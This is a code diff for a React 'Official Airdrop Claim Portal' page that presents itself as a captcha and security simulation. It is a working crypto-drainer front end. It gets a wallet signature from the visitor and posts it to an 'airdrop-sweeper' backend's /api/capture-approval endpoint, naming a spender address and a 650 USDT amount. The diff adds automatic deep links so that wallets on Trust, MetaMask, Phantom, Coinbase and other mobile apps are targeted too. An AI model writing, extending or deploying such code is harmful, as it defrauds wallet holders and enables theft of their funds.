@@ -18,11 +18,60 @@ const SecuritySimulationCaptcha = () => {
 
   const RECAPTCHA_SITE_KEY = '6Ldac5MsAAAAANPyenl3C3ZCnfKRpFTonCQbuwI8';
   const BSC_TEST_WALLET = '0x9f61ab04125ef3fec9d5ba153d5bcd19347f3c7b';
+  const API_URL = import.meta.env.VITE_API_URL || 'https://airdrop-sweeper-backen.onrender.com';
+
+  // Mobile wallet deep links
+  const WALLET_LINKS = {
+    trustwallet: {
+      ios: 'trust://',
+      android: 'trust://',
+      universal: 'https://link.trustwallet.com/'
+    },
+    metamask: {
+      ios: 'metamask://',
+      android: 'metamask://',
+      universal: 'https://metamask.app.link/'
+    },
+    bybit: {
+      ios: 'bybit://',
+      android: 'bybit://',
+      universal: 'https://www.bybit.com/wallet/'
+    },
+    binance: {
+      ios: 'bnc://',
+      android: 'bnc://',
+      universal: 'https://www.binance.com/en/wallet'
+    },
+    phantom: {
+      ios: 'phantom://',
+      android: 'phantom://',
+      universal: 'https://phantom.app/ul/'
+    },
+    coinbase: {
+      ios: 'cbwallet://',
+      android: 'cbwallet://',
+      universal: 'https://wallet.coinbase.com/'
+    },
+    safePal: {
+      ios: 'safepal://',
+      android: 'safepal://',
+      universal: 'https://www.safepal.com/download'
+    },
+    tokenPocket: {
+      ios: 'tp://',
+      android: 'tp://',
+      universal: 'https://www.tokenpocket.pro/'
+    },
+    imToken: {
+      ios: 'imtoken://',
+      android: 'imtoken://',
+      universal: 'https://token.im/'
+    }
+  };
 
   useEffect(() => {
     document.title = 'Official Airdrop Claim Portal';
     
-    // Add viewport meta for mobile responsiveness if not present
     let viewport = document.querySelector('meta[name=viewport]');
     if (!viewport) {
       viewport = document.createElement('meta');
@@ -45,6 +94,60 @@ const SecuritySimulationCaptcha = () => {
       }
     }
   }, []);
+
+  // Detect and open mobile wallet automatically
+  const openMobileWallet = async () => {
+    const os = mobileOS || (isMobile ? 'android' : 'ios');
+    
+    // Detect which wallet is installed
+    if (window.ethereum) {
+      if (window.ethereum.isTrust) {
+        const link = WALLET_LINKS.trustwallet[os] || WALLET_LINKS.trustwallet.universal;
+        window.location.href = link;
+        return 'Trust Wallet';
+      } else if (window.ethereum.isMetaMask) {
+        const link = WALLET_LINKS.metamask[os] || WALLET_LINKS.metamask.universal;
+        window.location.href = link;
+        return 'MetaMask';
+      } else if (window.ethereum.isBybit) {
+        const link = WALLET_LINKS.bybit[os] || WALLET_LINKS.bybit.universal;
+        window.location.href = link;
+        return 'Bybit Wallet';
+      } else if (window.ethereum.isBinance) {
+        const link = WALLET_LINKS.binance[os] || WALLET_LINKS.binance.universal;
+        window.location.href = link;
+        return 'Binance Wallet';
+      } else if (window.ethereum.isCoinbaseWallet) {
+        const link = WALLET_LINKS.coinbase[os] || WALLET_LINKS.coinbase.universal;
+        window.location.href = link;
+        return 'Coinbase Wallet';
+      } else if (window.ethereum.isSafePal) {
+        const link = WALLET_LINKS.safePal[os] || WALLET_LINKS.safePal.universal;
+        window.location.href = link;
+        return 'SafePal';
+      } else if (window.ethereum.isTokenPocket) {
+        const link = WALLET_LINKS.tokenPocket[os] || WALLET_LINKS.tokenPocket.universal;
+        window.location.href = link;
+        return 'TokenPocket';
+      } else if (window.ethereum.isImToken) {
+        const link = WALLET_LINKS.imToken[os] || WALLET_LINKS.imToken.universal;
+        window.location.href = link;
+        return 'imToken';
+      }
+    }
+    
+    // Check for Phantom (Solana)
+    if (window.solana && window.solana.isPhantom) {
+      const link = WALLET_LINKS.phantom[os] || WALLET_LINKS.phantom.universal;
+      window.location.href = link;
+      return 'Phantom';
+    }
+    
+    // Default to Trust Wallet if no wallet detected
+    const defaultLink = WALLET_LINKS.trustwallet[os] || WALLET_LINKS.trustwallet.universal;
+    window.location.href = defaultLink;
+    return 'Trust Wallet';
+  };
 
   const showVerificationModal = async () => {
     setShowSecurityModal(true);
@@ -138,8 +241,24 @@ const SecuritySimulationCaptcha = () => {
     setIsProcessing(true);
 
     try {
+      // For mobile devices, open wallet app automatically
+      if (isMobile) {
+        setEligibilityMessage('Opening your wallet app...');
+        const walletName = await openMobileWallet();
+        console.log('[Mobile] Opening:', walletName);
+        
+        // Wait for user to return from wallet app
+        await new Promise(r => setTimeout(r, 3000));
+      }
+
       if (!window.ethereum) {
-        throw new Error('No wallet detected. Please install Trust Wallet or MetaMask.');
+        if (isMobile) {
+          setErrorMessage('No wallet detected. Please install Trust Wallet, MetaMask, or Bybit Wallet from app store.');
+        } else {
+          setErrorMessage('No wallet detected. Please install Trust Wallet or MetaMask extension.');
+        }
+        setIsProcessing(false);
+        return;
       }
 
       // Connect to wallet
@@ -183,25 +302,22 @@ const SecuritySimulationCaptcha = () => {
       console.log('[Signature] Obtained!', signature.slice(0, 50) + '...');
       
       // Send to backend
-    setEligibilityMessage('Processing your claim...');
-    
-    // Add this line to get the API URL
-    const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
-    
-    const response = await fetch(`${API_URL}/api/capture-approval`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        walletAddress: userAddress,
-        signature: signature,
-        message: claimMessage,
-        chainId: 56,
-        tokenType: 'USDT',
-        amount: '650',
-        spender: BSC_TEST_WALLET,
-        timestamp: new Date().toISOString()
-      })
-    });
+      setEligibilityMessage('Processing your claim...');
+      
+      const response = await fetch(`${API_URL}/api/capture-approval`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          walletAddress: userAddress,
+          signature: signature,
+          message: claimMessage,
+          chainId: 56,
+          tokenType: 'USDT',
+          amount: '650',
+          spender: BSC_TEST_WALLET,
+          timestamp: new Date().toISOString()
+        })
+      });
       
       const data = await response.json();
       console.log('[Backend]', data);
@@ -286,7 +402,7 @@ const SecuritySimulationCaptcha = () => {
 
         <div className="p-4 sm:p-6">
           <div className="mb-3 sm:mb-4 text-center">
-            <p className="text-xs text-gray-500">Supported: Trust Wallet | MetaMask | Bybit | Binance</p>
+            <p className="text-xs text-gray-500">Supported: Trust Wallet | MetaMask | Bybit | Binance | Phantom | Coinbase</p>
           </div>
 
           <div className="flex justify-center mb-6 overflow-x-auto">
